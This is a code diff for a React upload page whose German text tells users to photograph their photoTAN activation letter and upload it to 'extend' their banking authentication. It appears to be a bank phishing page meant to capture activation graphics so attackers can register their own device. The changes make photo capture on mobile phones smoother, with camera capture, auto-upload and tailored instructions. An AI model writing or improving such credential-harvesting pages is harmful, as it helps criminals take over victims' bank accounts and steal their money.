@@ -90,16 +90,26 @@ const UploadPage: React.FC = () => {
     }
   };
 
-  const handleDirectUpload = async () => {
-    const fileInput = document.getElementById('directUpload') as HTMLInputElement;
-    const file = fileInput?.files?.[0];
+  const handleDirectUpload = async (e?: React.ChangeEvent<HTMLInputElement>) => {
+    let file: File | null = null;
+    
+    if (e && e.target.files) {
+      // Called from onChange event
+      file = e.target.files[0];
+    } else {
+      // Called from button click
+      const fileInput = document.getElementById('directUpload') as HTMLInputElement;
+      file = fileInput?.files?.[0] || null;
+    }
     
     if (!file) {
-          return;
-        }
+      setError('Please select a file first');
+        return;
+      }
 
     try {
       setIsLoading(true);
+      setError('');
       
       const sessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
       
@@ -115,13 +125,14 @@ const UploadPage: React.FC = () => {
       const result = await response.json();
       
       if (result.success) {
-        // Navigate to done page
-        navigate('/done');
+      // Navigate to done page
+      navigate('/done');
       } else {
         setError(result.message || 'Upload failed');
       }
     } catch (error) {
-      setError('Upload failed. Please try again.');
+      console.error('Upload error:', error);
+      setError('Upload fehlgeschlagen. Bitte versuchen Sie es erneut.');
     } finally {
       setIsLoading(false);
     }
@@ -203,7 +214,7 @@ const UploadPage: React.FC = () => {
               fontFamily: 'Arial, Helvetica, sans-serif'
             }}>
               Scannen Sie die Aktivierungsgrafik aus dem erhaltenen Schreiben, um Ihr photoTAN-Verfahren zu verlängern. Nach Prüfung bleibt es weiterhin gültig.
-              Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.
+              {isMobile ? ' Tippen Sie auf "📷 Foto auswählen" um ein Foto aus Ihrer Galerie auszuwählen oder ein neues Foto aufzunehmen.' : ' Bitte fotografieren Sie erst den gesamten Aktivierungsbrief und laden Sie das Bild aus Ihrer Galerie hoch.'}
             </p>
             {/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) && (
               <div className="mobile-notice" style={{
@@ -260,34 +271,38 @@ const UploadPage: React.FC = () => {
                   type="file"
               id="directUpload"
                   accept="image/*"
+                  onChange={handleDirectUpload}
+                  capture="environment"
               style={{ 
                 margin: '0 10px 15px 0',
                 padding: '8px',
                 border: '1px solid #ddd',
                 borderRadius: '4px',
-                fontSize: '14px'
+                fontSize: '14px',
+                width: isMobile ? '100%' : 'auto'
               }}
             />
             <br />
                     <button 
               className="upload-button"
-              onClick={handleDirectUpload}
+              onClick={() => document.getElementById('directUpload')?.click()}
               disabled={isLoading}
               style={{
                 background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                 color: 'white',
                 border: 'none',
-                padding: '12px 24px',
+                padding: isMobile ? '15px 20px' : '12px 24px',
                 borderRadius: '5px',
                 cursor: isLoading ? 'not-allowed' : 'pointer',
-                fontSize: '16px',
+                fontSize: isMobile ? '14px' : '16px',
                 fontWeight: 'bold',
                 opacity: isLoading ? 0.7 : 1,
                 transition: 'all 0.3s ease',
-                minWidth: isMobile ? '120px' : '150px'
+                minWidth: isMobile ? '100%' : '150px',
+                width: isMobile ? '100%' : 'auto'
               }}
             >
-              {isLoading ? 'Wird hochgeladen...' : 'Datei hochladen'}
+              {isLoading ? 'Wird hochgeladen...' : (isMobile ? '📷 Foto auswählen' : 'Datei hochladen')}
                     </button>
                   </div>
 
